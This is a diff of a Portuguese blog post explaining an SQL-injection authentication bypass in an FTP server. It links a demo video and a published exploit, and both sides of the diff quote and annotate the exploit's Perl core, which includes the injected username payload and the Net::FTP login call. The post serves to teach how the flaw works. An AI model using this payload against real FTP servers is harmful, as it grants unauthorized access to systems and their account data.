@@ -116,7 +116,7 @@ E com isso ele conseguia rodar comandos no FTP server sem conhecer nenhum login 
 
 Aos 4:20 deste vídeo, é demonstrado a utilização de um exploit que explora essa falha:
 
-<iframe width="854" height="480" src="https://www.youtube.com/embed/s5EtYRiMf_o?ecver=1" frameborder="0" allowfullscreen></iframe>
+<iframe width="780" height="480" src="https://www.youtube.com/embed/s5EtYRiMf_o?ecver=1" frameborder="0" allowfullscreen></iframe>
 
 
 Em uma simples análise do exploit utilizado no vídeo:
@@ -125,22 +125,21 @@ http://downloads.securityfocus.com/vulnerabilities/exploits/33722.pl
 
 É possível perceber a simplicidade da exploração da falha:
 
-```
-$host = $ARGV[0]; # Variável $host recebe o endereço IP do servidor á ser atacado
+<pre style="background:#000;color:#f8f8f8"><span style="color:#3e87e3">$host</span> = <span style="color:#3e87e3">$ARGV</span>[0]; <span style="color:#aeaeae;font-style:italic"># Variável $host recebe o endereço IP do servidor á ser atacado</span>
 
-# Variável $user é inicializada com pedaço de código SQL que deverá 'confundir'
-# processo de autenticação no lado do servidor:
-$user = "USER %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; --"; 
-$pass = '1';
+<span style="color:#aeaeae;font-style:italic"># Variável $user é inicializada com pedaço de código SQL que deverá 'confundir'</span>
+<span style="color:#aeaeae;font-style:italic"># processo de autenticação no lado do servidor:</span>
+<span style="color:#3e87e3">$user</span> = <span style="color:#65b042">"USER %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; --"</span>; 
+<span style="color:#3e87e3">$pass</span> = <span style="color:#65b042">'1'</span>;
 
-# Variável $ftp armazena descritor de conexão estabelecida com servidor FTP
-$ftp = Net::FTP->new("$host", Debug => 0) or die "[!] Cannot connect to $host";
+<span style="color:#aeaeae;font-style:italic"># Variável $ftp armazena descritor de conexão estabelecida com servidor FTP</span>
+<span style="color:#3e87e3">$ftp</span> = Net::FTP<span style="color:#e28964">-></span>new(<span style="color:#65b042">"<span style="color:#8a9a95">$host</span>"</span>, <span style="color:#3387cc">Debug </span>=> 0) <span style="color:#e28964">or</span> <span style="color:#e28964">die</span> <span style="color:#65b042">"[!] Cannot connect to <span style="color:#8a9a95">$host</span>"</span>;
 
-# O login malicioso é realizado, perceba que nome de usuário é simplesmente
-# o conteúdo de $user
-$ftp->login("$user","$pass") or die "\n\n[!] Couldn't ByPass The authentication ! ", $ftp->message;
-print "\n[*] Connected To $host";
-```
+<span style="color:#aeaeae;font-style:italic"># O login malicioso é realizado, perceba que nome de usuário é simplesmente</span>
+<span style="color:#aeaeae;font-style:italic"># o conteúdo de $user</span>
+<span style="color:#3e87e3">$ftp</span><span style="color:#e28964">-></span>login(<span style="color:#65b042">"<span style="color:#8a9a95">$user</span>"</span>,<span style="color:#65b042">"<span style="color:#8a9a95">$pass</span>"</span>) <span style="color:#e28964">or</span> <span style="color:#e28964">die</span> <span style="color:#65b042">"<span style="color:#ddf2a4">\n</span><span style="color:#ddf2a4">\n</span>[!] Couldn't ByPass The authentication ! "</span>, <span style="color:#3e87e3">$ftp</span><span style="color:#e28964">-></span>message;
+<span style="color:#dad085">print</span> <span style="color:#65b042">"<span style="color:#ddf2a4">\n</span>[*] Connected To <span style="color:#8a9a95">$host</span>"</span>;
+</pre>
 
 
 
